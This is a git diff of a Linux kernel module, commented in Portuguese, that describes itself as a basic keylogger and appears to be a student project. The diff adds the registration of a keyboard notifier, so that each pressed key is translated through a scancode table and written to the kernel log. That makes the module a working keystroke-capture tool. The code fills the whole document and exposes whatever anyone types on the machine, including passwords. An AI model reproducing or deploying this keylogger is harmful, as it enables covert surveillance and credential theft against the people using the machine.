@@ -1,17 +1,15 @@
-#include <linux/module.h>
-#include <linux/moduleparam.h>
 #include <linux/init.h>
 #include <linux/kernel.h>   
-#include <linux/proc_fs.h> 
-#include <linux/fs.h>
+#include <linux/module.h>
+#include <linux/moduleparam.h>
 #include <linux/keyboard.h>
-#include <linux/debugfs.h>
 #include <linux/input.h>
 
 #define final_key 126
 
-MODULE_LICENSE("Dual BSD/GPL");
 MODULE_AUTHOR("Luis Otavio O.C, Pedro P.");
+MODULE_LICENSE("Dual BSD/GPL");
+MODULE_DESCRIPTION("Um keylogger básico.");
  
 
 // mapeando as teclas do teclado de acordo com scancode
@@ -148,16 +146,16 @@ static const char *teclado[][2] = {
 // converter o código da tecla para uma string
 void converte_code(int keycode, int shift_mask)
 {
-	if (keycode > KEY_RESERVED && keycode <= final_key) {
+	if (keycode > KEY_RESERVED && keycode <= final_key) { // se está no intervalo de teclas permitidas
 		const char *tecla = teclado[keycode][shift_mask]; //pegando a tecla na posição da matriz, se está com shift ativado ou não
 		printk(KERN_INFO "%s\n", tecla); //escrevendo a tecla digitada
 	}
 }
 
 // função para chamar o tradutor de tecla
-int callback(struct notifier_block *nblock, unsigned long code, void *_param)
+int callback(struct notifier_block *bloco, unsigned long code, void *_parametro)
 {
-	struct keyboard_notifier_param *param = _param;
+	struct keyboard_notifier_param *param = _parametro;
 
 	// executar somente quando uma tecla for pressionada e o código vier como inteiro
 	if (param->down && code == KBD_KEYCODE){
@@ -173,16 +171,21 @@ static struct notifier_block notificador =
     .notifier_call = callback
 };
 
-static int __init simple_init(void)
+// função para inciar o módulo
+static int __init iniciar(void)
 {
-	printk(KERN_ALERT "Inicializando o keylogger\n");
+	// escrevendo mensagem no /var/log/kern.log
+	printk(KERN_INFO "Inicializando o keylogger\n"); //escrever mensagem de informação
+	register_keyboard_notifier(&notificador); //adicionado o notificador à lista de eventos do teclado, para chamar a callback quando um evento ocorrer
 	return 0;
 }
  
-static void __exit simple_cleanup(void)
+// função para encerrar o módulo
+static void __exit finalizar(void)
 {
-	printk(KERN_WARNING "Finalizando o keylogger\n");
+	unregister_keyboard_notifier(&notificador);
+	printk(KERN_INFO "Finalizando o keylogger\n");
 }
  
-module_init(simple_init);
-module_exit(simple_cleanup);
+module_init(iniciar); //inserir módulo no kernel
+module_exit(finalizar); //remover módulo do kernel
